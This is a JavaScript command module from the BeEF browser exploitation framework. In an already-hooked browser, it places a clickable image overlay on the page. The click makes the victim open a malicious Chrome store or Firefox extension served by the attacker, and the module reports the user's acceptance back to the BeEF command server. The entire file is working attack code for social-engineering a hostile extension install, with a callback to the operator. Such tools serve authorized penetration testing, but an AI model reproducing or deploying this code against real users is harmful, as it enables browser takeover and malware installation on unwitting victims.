//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  
  	// Grab image and payload from config
  	var image = "<%== @image %>";
    var payload_type = "<%== @payload %>";
    var payload_root =  "<%== @payload_root %>";
    var chrome_store_uri = "<%== @chrome_store_uri %>";
    var firefox_extension = "/api/ipec/ff_extension";
    var payload = "";

    switch (payload_type) {
        case "Chrome_Extension":
            payload = chrome_store_uri;
            break;
        case "Firefox_Extension":
            payload = payload_root + firefox_extension;
            break;
        default:
            beef.net.send('<%= @command_url %>', <%= @command_id %>, 'answer=Error. No Payload selected.');
            break;
    }

  	// Add div to page
    var div = document.createElement('div');
	div.setAttribute('id', 'splash');
	div.setAttribute('style', 'position:absolute; top:30%; left:40%;');
	div.setAttribute('align', 'center');
	document.body.appendChild(div);
	// window.open is very useful when using data URI vectors and the IFrame/Object tag
	// also, as the user is clicking on the link, the new tab opener is not blocked by the browser.
    div.innerHTML= "<a href=\"javascript:window.open('" + payload + "')\"><img src=\"" + image + "\" /></a>";
    $j("#splash").click(function () {
      $j(this).hide();
        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'answer=user has accepted');
    });
});
